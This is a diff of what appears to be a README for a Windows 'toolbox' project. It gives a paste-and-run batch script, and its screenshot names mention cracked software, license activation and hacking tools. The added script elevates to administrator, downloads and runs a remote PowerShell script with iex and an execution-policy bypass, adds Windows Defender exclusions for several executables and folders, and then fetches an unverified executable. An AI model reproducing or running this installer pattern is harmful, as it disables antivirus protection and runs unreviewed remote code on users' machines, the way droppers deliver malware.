@@ -3,71 +3,56 @@
    - Copy the following Code into an Text Document and save as .cmd File, then Start the file.
    - or Download [THIS FILE](https://github.com/SaoasBlubb/Saoas_Toolbox/releases/download/latest/Saoas_Toolbox.cmd) and Start the file.
 ```
-@echo off
-<!-- : --- Self-elevating.bat ---------------------------------------
-whoami /groups | find "S-1-16-12288" > nul && goto :ELEVATED
-echo Requesting administrative privileges...
-set "ELEVATE_CMDLINE=cd /d "%cd%" & call "%~f0" %*"
-cscript //nologo "%~f0?.wsf" //job:Elevate & exit /b
+@echo off & setlocal
+net session >NUL 2>&1 && goto :ELEVATED
+set ELEVATE_CMDLINE=cd /d "%~dp0" ^& "%~f0" %*
+powershell.exe -noprofile -c Start-Process -Verb RunAs cmd.exe \"/c $env:ELEVATE_CMDLINE\"
+exit /b %ERRORLEVEL%
+:ELEVATED
 
--->
-<job id="Elevate"><script language="VBScript">
-  Set objShell = CreateObject("Shell.Application")
-  Set objWshShell = WScript.CreateObject("WScript.Shell")
-  Set objWshProcessEnv = objWshShell.Environment("PROCESS")
-  strCommandLine = Trim(objWshProcessEnv("ELEVATE_CMDLINE"))
-  objShell.ShellExecute "cmd", "/c " & strCommandLine, "", "runas"
-</script></job>
-:ELEVATED -----------------------------------------------------------
+set "psCommand=Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://files.saoas.tv/path.ps1'))"
 
+mkdir "%USERPROFILE%\Desktop\Saoas_Tools"
+mkdir "C:\Saoas"
+
+powershell -NoLogo -Sta -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "& {%psCommand%}"
 powershell -Command Add-MpPreference -ExclusionProcess "Saoas_Toolbox.exe" -Force
-cd /d "%USERPROFILE%/Desktop/"
-powershell Invoke-WebRequest -Uri "https://eternallybored.org/misc/wget/1.21.4/64/wget.exe" -OutFile "wget.exe" 
-wget -q --show-progress --user-agent="chrome" --no-hsts "https://files.saoas.tv/Toolbox/Saoas_Toolbox.exe" -O Saoas_Toolbox.exe
-del /f wget.exe 
-Saoas_Toolbox.exe
+powershell -Command Add-MpPreference -ExclusionProcess "Installer.exe" -Force
+powershell -Command Add-MpPreference -ExclusionProcess "Multi_Downloader.exe" -Force
+powershell -Command Add-MpPreference -ExclusionPath "%USERPROFILE%\Desktop\Saoas_Tools" -Force
+powershell -Command Add-MpPreference -ExclusionPath "C:\Saoas" -Force
+
+cd "%USERPROFILE%\Desktop\Saoas_Tools"
+powershell Invoke-WebRequest -Uri "https://eternallybored.org/misc/wget/1.21.4/64/wget.exe" -OutFile "wget.exe"
+xcopy %USERPROFILE%\Desktop\Saoas_Tools\wget.exe C:\Saoas /y
+wget -q --show-progress --user-agent="chrome" --no-hsts https://files.saoas.tv/Toolbox/Saoas_Toolbox.exe -O Saoas_Toolbox.exe
+del %USERPROFILE%\Desktop\Saoas_Tools\wget.exe
+move %USERPROFILE%\Desktop\Saoas_Tools\Saoas_Toolbox.exe %USERPROFILE%\Desktop
+
 ```
 
 #####
 
 
-![ToolboxMainMenu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/e18d2b7e-3323-436f-ada4-b246e98b52b4)
-
-
-![ToolsMenu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/46057e1f-c5bd-4644-aa75-57631ae0a01f)
-
-
-![Runtimes_FrameworksMenu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/4ace0f05-0ea8-4267-b83c-8de877e3c1bd)
-
-
-![ProgramsMenu1](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/14f86f14-a54d-46b3-88c8-6e1160d660d4)
-
-
-![InternetBrowsersMenu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/87085c82-b26a-4bd1-b98d-eecec9ed6a21)
-
-
-![WindowsTweaksMainMenu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/74ced1a0-19b5-48df-8d8e-21142867609c)
-
-
-![WindowsTweaksMenu1](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/db9116b3-1399-43fb-99a8-b9e876ec5634)
-
-
-![WindowsTweaksMenu2](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/d5089525-6998-4409-b83b-fdc68622880f)
-
-
-![WindowsTweaksMenu3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/10eec5e0-2626-4f46-b779-b85bd6489391)
-
-
-![ContextTweaksMenu1](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/7a6cc607-1bd9-491b-bb81-63046b3ef750)
-
-
-![ContextTweaksMenu2](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/c5f487dd-4841-446b-9428-50de84b6b60c)
-
-
-![ContextTweaksMenu3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/46fa3f79-b355-44bb-b8ba-43ffa0b32912)
-
-
-![ContextTweaksMenu4](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/d9f628ea-4f3d-4654-b113-383d885cc426)
-
-
-![PacketManagersMenu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/20e6533e-9781-480d-b3e1-a21a46e99609)
+![PAcket_Managers_Menu_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/e4dd290c-0853-47aa-9269-42878cd199d8)
+![Cracked_Files_Main_Menu_3of3_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/bc08218b-c0b8-499c-95ab-5d840495f47b)
+![Cracked_Files_Main_Menu_2of3_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/3b22f508-e915-4e02-aae8-e1c41a6e0221)
+![Cracked_Files_Main_Menu_1of3_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/c7ea0603-dad6-4b3d-be20-b63ebc97e14f)
+![Office_Install_Activation_Menu_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/52afce7d-89ce-4b4a-a632-934fedcb3c56)
+![Windows_Install_Activation_Menu_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/c1ab1ab5-f8c8-41a8-b415-7b937fd8eab9)
+![Windows_Tweaks_Menu_3of3_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/788077a0-f5eb-416c-b001-4276efbd0add)
+![Windows_Tweaks_Menu_2of3_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/e0b14c7c-8276-42fc-8d63-3e744cf3c1e9)
+![Windows_Tweaks_Menu_1of3_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/748ee5bb-546a-4dd5-97c7-741d182d80ef)
+![Windows_Context_Tweaks_Menu_4of4_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/1555e886-3a02-461c-b23a-53ec00a88374)
+![Windows_Context_Tweaks_Menu_3of4_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/e277a2f9-0e21-4ddf-958c-4792f08d82df)
+![Windows_Context_Tweaks_Menu_2of4_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/92e58e4c-c74c-4f8c-8472-4b3bc3123a13)
+![Windows_Context_Tweaks_Menu_1of4_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/ce7353f3-3e36-4227-80d4-c0890d32ae8b)
+![Windows_Tweaks_Main_Menu_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/8767eeca-1ec9-4792-9e10-f90ca370ade3)
+![Internet_Browsers_Menu_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/44f7c0d2-2a27-4f9d-8a35-4c8f577649f7)
+![Hacking_Tools_Menu_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/055404e6-9911-4fc4-af6b-9025ddad232b)
+![Programs_Menu_2of2_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/6eb46d6b-eaf0-472b-a018-354eeaa40806)
+![Programs_Menu_1of2_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/01cf5411-e444-4158-b0c4-672fe9b9b2e3)
+![Programs_and_Hacking_tools_Menu_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/7ee83d03-7b56-4232-b271-2b3b0f132947)
+![Runtimes_Frameworks_Menu_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/15dbc0b4-67f8-4b40-bec9-151c1b4f5c0b)
+![Saoas_Tools_Menu_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/9f8b618e-0b44-4e1e-824b-1f53b3fe3cda)
+![Toolbox_Main_Menu_v 8 8 3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/06704b2a-1807-42c2-926e-1fc8c6b697ad)
